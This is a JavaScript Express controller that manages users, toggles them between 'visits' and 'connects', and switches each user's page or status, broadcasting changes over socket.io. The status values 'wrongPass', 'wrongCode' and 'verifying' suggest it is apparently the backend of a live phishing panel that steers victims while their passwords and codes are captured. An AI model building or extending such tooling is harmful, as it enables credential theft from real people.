import { User } from "../models/user.model.js";
import { asyncHandler } from "../utils/asyncHandler.js";

const getAllUser = asyncHandler(async (req, res) => {
  try {
    const users = await User.find({ role: { $ne: "admin" } }).sort({
      createdAt: -1,
    });

    if (users.length === 0) {
      return res.status(200).json([]);
    }
    res.status(200).json(users);
  } catch (error) {
    console.log("Error in getAllUser controller", error);
    res.status(500).json({ error: "Internal Server Error" });
  }
});

const changeSituation = asyncHandler(async (req, res) => {
  try {
    const { userId } = req.params;

    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    const alreadyConnects = user?.situation === "connects";

    if (!alreadyConnects) {
      await User.findByIdAndUpdate(
        userId,
        { situation: "connects" }, // Update the situation field
        { new: true } // Return the updated document
      );
    } else {
      await User.findByIdAndUpdate(
        userId,
        { situation: "visits" }, // Update the situation field
        { new: true } // Return the updated document
      );
    }

    const updatedUser = await User.findById(userId);

    res.status(200).json(updatedUser);
  } catch (error) {
    console.log("Error in changeSituation controller", error);
    res.status(500).json({ error: "Internal Server Error" });
  }
});

const changePage = asyncHandler(async (req, res) => {
  try {
    const { userId, pageName } = req.params;
    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    if (
      pageName === "wrongPass" ||
      pageName === "wrongCode" ||
      pageName === "verifying" ||
      pageName === "normal"
    ) {
      user.currentStatus = pageName.toString();
    } else {
      user.currentPage = pageName.toString();
      user.currentStatus = "normal";
    }

    await user.save();

    // Emit the event using socket.io
    const io = req.app.get("socketio");
    io.emit("page_changed", { page: pageName.toString() });

    res.status(200).json({ message: "Page changed" });
  } catch (error) {
    console.log("Error in changePage controller", error);
    res.status(500).json({ error: "Internal Server Error" });
  }
});

const deleteUser = asyncHandler(async (req, res) => {
  try {
    const { userId } = req.params;
    await User.findByIdAndDelete(userId);
    res.status(200).json({ message: "User deleted" });
  } catch (error) {
    console.log("Error in deleteUser controller", error);
    res.status(500).json({ error: "Internal Server Error" });
  }
});

const getVisits = asyncHandler(async (req, res) => {
  try {
    const users = await User.find({ situation: { $ne: "connects" } });
    const count = users.length;
    if (count === 0) {
      return res.status(200).json([]);
    }
    return res.status(200).json(count);
  } catch (error) {
    console.log("Error in getVisits controller", error);
    res.status(500).json({ error: "Internal Server Error" });
  }
});

const getConnects = asyncHandler(async (req, res) => {
  try {
    const users = await User.find({ situation: { $ne: "visits" } });
    const count = users.length;
    if (count === 0) {
      return res.status(200).json([]);
    }
    return res.status(200).json(count);
  } catch (error) {
    console.log("Error in getVisits controller", error);
    res.status(500).json({ error: "Internal Server Error" });
  }
});

const deletAlluser = async (req, res) => {
  try {
    await User.deleteMany();
    res.status(200).json({ message: "Done" });
  } catch (error) {
    console.log("Error in deletAlluser controller", error);
    res.status(500).json({ error: "Internal Server Error" });
  }
};

export {
  getAllUser,
  changeSituation,
  changePage,
  deleteUser,
  deletAlluser,
  getVisits,
  getConnects,
};
